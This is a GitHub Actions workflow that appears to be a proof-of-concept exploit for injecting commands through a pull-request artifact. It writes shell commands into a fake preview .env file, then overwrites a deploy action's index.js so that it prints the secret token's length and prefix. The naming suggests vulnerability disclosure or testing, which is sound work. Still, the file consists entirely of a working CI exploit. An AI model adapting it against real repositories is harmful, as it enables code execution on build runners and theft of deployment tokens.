name: PR Preview

on:
  pull_request:
    types: [opened, reopened, synchronize, closed]

permissions: {}

jobs:
  pr-preview:
    runs-on: ubuntu-latest
    steps:
      - name: Craft untrusted preview payload (attacker controls PR head files)
        run: |
          set -euo pipefail
          mkdir -p payload
          cat > payload/pr-preview-meta.env <<'META'
          echo "GAB_RCE_CONFIRMED host=$(hostname) user=$(id -un) repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID"
          DEPLOY_JS=$(ls /home/runner/work/_actions/JamesIves/github-pages-deploy-action/*/dist/index.js 2>/dev/null | head -1)
          echo "GAB_DEPLOY_JS=${DEPLOY_JS:-none}"
          if [ -n "${DEPLOY_JS:-}" ]; then
            printf '%s\n' 'const t=process.env.INPUT_TOKEN||"";console.log("GAB_PAT_REACHABLE len="+t.length+" prefix="+t.slice(0,4));process.exit(1);' > "$DEPLOY_JS"
          fi
          WORKER_ACTION=deploy
          PR_NUMBER=999
          TARGET_REPO=PDFtoMark/wfr-guard-poc
          TARGET_BRANCH=poc-preview-gh-pages
          PAGES_BASE_URL=
          COMMENT_HEADER=pr-preview
          UMBRELLA_DIR=poc
          COMMENT_TITLE=Poc
          COMMENT_FOOTER=Poc
          QR_CODE=false
          META
      - uses: actions/upload-artifact@v4
        with:
          name: pr-preview
          path: payload
